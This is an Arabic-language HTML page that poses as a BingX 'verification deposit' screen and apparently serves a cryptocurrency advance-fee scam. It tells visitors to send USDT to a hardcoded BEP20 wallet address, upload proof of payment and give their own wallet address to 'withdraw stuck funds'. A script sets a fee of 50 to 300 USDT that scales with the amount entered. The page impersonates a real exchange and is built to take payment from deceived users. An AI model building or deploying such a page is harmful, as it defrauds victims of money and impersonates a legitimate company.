<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>إيداع التحقق - BingX</title>
<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  .wallet-frame{ background:rgba(255,255,255,0.05); padding:10px; border-radius:8px; margin:6px 0; overflow-x:auto; }
  .btn-primary{ background:#f1c40f; color:#000; padding:10px; border:none; border-radius:8px; cursor:pointer; }
  .btn-ghost{ background:transparent; color:#f1c40f; border:1px solid #f1c40f; padding:10px; border-radius:8px; cursor:pointer; }
</style>
</head>
<body>
<div class="container">
<div class="card">
<h3>إيداع التحقق</h3>
<p id="deposit-msg" class="muted">تحقق من رصيدك لتحديد مبلغ الإيداع.</p>

<label>عنوان الإيداع (شبكة BEP20)</label>
<div class="wallet-frame" id="deposit-address">0x3932890a5d1acb3ab036bd39ade26c47929b37e5</div>
<button class="btn-ghost" onclick="copyDepositAddress()">نسخ العنوان</button>

<h4>أرفق إثبات الإيداع</h4>
<input id="proof-file" type="file" accept="image/*" />
<div id="proof-file-name" class="proof-name"></div>

<label>محفظتك هنا USDT BEP20</label>
<input id="withdraw-wallet" placeholder="أدخل عنوان محفظتك">

<label>المبلغ المراد إيداعه</label>
<input id="deposit-amount" type="number" placeholder="أدخل المبلغ">

<div style="display:flex; gap:8px; margin-top:10px;">
<button class="btn-primary" onclick="submitDeposit()">إرسال إثبات الإيداع</button>
<button class="btn-ghost" onclick="withdrawStuck()">سحب الأموال العالقة</button>
</div>
<p id="deposit-log" class="muted" style="margin-top:10px"></p>
</div>
</div>

<script src="script.js"></script>
<script>
document.addEventListener('DOMContentLoaded', ()=>{
  let balance = parseFloat(localStorage.getItem('current-balance')||0);
  const depositMsg = document.getElementById('deposit-msg');
  const depositInput = document.getElementById('deposit-amount');

  depositInput.addEventListener('input', ()=>{
    const val = parseFloat(depositInput.value||0);
    if(val < 500) depositMsg.innerText = 'الحد الأدنى للإيداع: 50 USDT';
    else if(val >=500 && val <1000) depositMsg.innerText = 'الإيداع المطلوب: 100 USDT';
    else if(val >=1000 && val <2000) depositMsg.innerText = 'الإيداع المطلوب: 200 USDT';
    else depositMsg.innerText = 'الإيداع المطلوب: 300 USDT';
  });
});
</script>
</body>
</html>
